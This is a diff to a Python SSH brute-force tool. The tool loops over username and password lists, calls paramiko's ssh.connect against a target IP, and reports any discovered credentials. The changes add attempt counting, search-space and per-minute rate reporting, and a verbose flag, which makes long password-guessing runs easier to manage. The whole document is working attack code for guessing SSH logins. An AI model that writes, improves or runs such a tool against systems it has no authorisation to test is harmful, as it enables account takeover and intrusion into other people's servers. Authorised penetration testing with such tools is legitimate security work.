@@ -12,6 +12,8 @@ logging.basicConfig()
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.ERROR)
 
+logging.getLogger("paramiko").setLevel(logging.CRITICAL)
+
 
 class Engine(object):
     user_path = None
@@ -25,9 +27,12 @@ class Engine(object):
     num_pools = 10
 
     start_time = 0.0
+    interval_start = 0.0
     end_time = 0.0
 
-    def __init__(self, target, userfile=None, req_time=0.0, passfile=None):
+    verbose = False
+
+    def __init__(self, target, userfile=None, req_time=0.0, passfile=None, verbose=False):
         """
         Initialize ssh brute force engine
         :param target: should be an IP address (string)
@@ -40,6 +45,7 @@ class Engine(object):
         self.target = target
         self.user_path = userfile
         self.pass_path = passfile
+        self.verbose = verbose
         if self.user_path:
             self.userlist = self.load_file(userfile)
         if self.pass_path:
@@ -77,23 +83,36 @@ class Engine(object):
         curr_conn_attempts = 0
         wait_backoff = 1
 
+        count = 0
+        search_space = len(self.userlist)*len(self.passlist)
+
+        print('Executing. Total search space: %s' % search_space)
+
         for user in self.userlist:
             for pw in self.passlist:
                 while not successful:
                     try:
+                        count += 1
                         curr_conn_attempts += 1
                         ssh.connect(self.target, username=user, password=pw)
                     except BadHostKeyException:
                         raise
                     except AuthenticationException:
                         logger.info('Failed: %s:%s' % (user, pw))
-                        print('Failed: %s:%s' % (user, pw))
+                        if count % 1000 == 0:
+                            int_time = time.time() - self.interval_start
+                            count_per_min = 1000.00/(int_time/60)
+                            params = (user, pw, count, search_space, time.time()-self.start_time, count_per_min)
+                            print('Failed: %s:%s. Attempted %s of %s. Elapsed Time: %s s (%s per min)' % params)
+                        elif self.verbose:
+                            print('Failed: %s:%s' % (user, pw))
                         successful = True
                     except SSHException:
                         ssh.close()
                         ssh = self.init_ssh()
                         time.sleep(wait_backoff)
                         wait_backoff += 1
+                        count -= 1
                         if curr_conn_attempts >= max_conn_attempts:
                             logger.info('Could not connect to target: %s' % self.target)
                             print('Could not connect to target: %s' % self.target)
@@ -124,10 +143,11 @@ class Engine(object):
         print('Caught signal. Exiting.')
         logger.info('\nCaught signal. Exiting.')
         print('Discovered credentials: %s' % self.credentials)
+        print('Elapsed Time: %s s' % (time.time()-self.start_time, ))
         sys.exit(0)
 
 
-def main(ip_addr, userfile=None, req_time=0.0, passfile=None):
+def main(ip_addr, userfile=None, req_time=0.0, passfile=None, verbose=False):
     if ip_addr == '' or not ip_addr:
         print('No target IP specified')
         return
@@ -135,7 +155,7 @@ def main(ip_addr, userfile=None, req_time=0.0, passfile=None):
         userfile = None
     if passfile == '':
         passfile = None
-    engine = Engine(target=ip_addr, userfile=userfile, req_time=req_time, passfile=passfile)
+    engine = Engine(target=ip_addr, userfile=userfile, req_time=req_time, passfile=passfile, verbose=verbose)
     engine.execute()
 
 if __name__ == "__main__":
@@ -144,11 +164,13 @@ if __name__ == "__main__":
     parser.add_argument('-u', '--userlist', help='Specify a filepath with a list of usernames to try -- one username per line')
     parser.add_argument('-p', '--passlist', help='Specify a filepath with a list of passwords to try -- one password per line')
     parser.add_argument('-t', '--time', help='Set the time between requests (in seconds)')
+    parser.add_argument('-v', '--verbose', action='count', help='Set the output to be more verbose')
 
     ip_addr = None
     user_filename = None
     pass_filename = None
     req_time = 0.0
+    verbose = False
     args = parser.parse_args()
 
     if args.ip:
@@ -159,4 +181,6 @@ if __name__ == "__main__":
         pass_filename = args.passlist
     if args.time:
         req_time = float(args.time)
-    main(ip_addr, user_filename, req_time, pass_filename)
+    if args.verbose and args.verbose > 0:
+        verbose = True
+    main(ip_addr, user_filename, req_time, pass_filename, verbose)
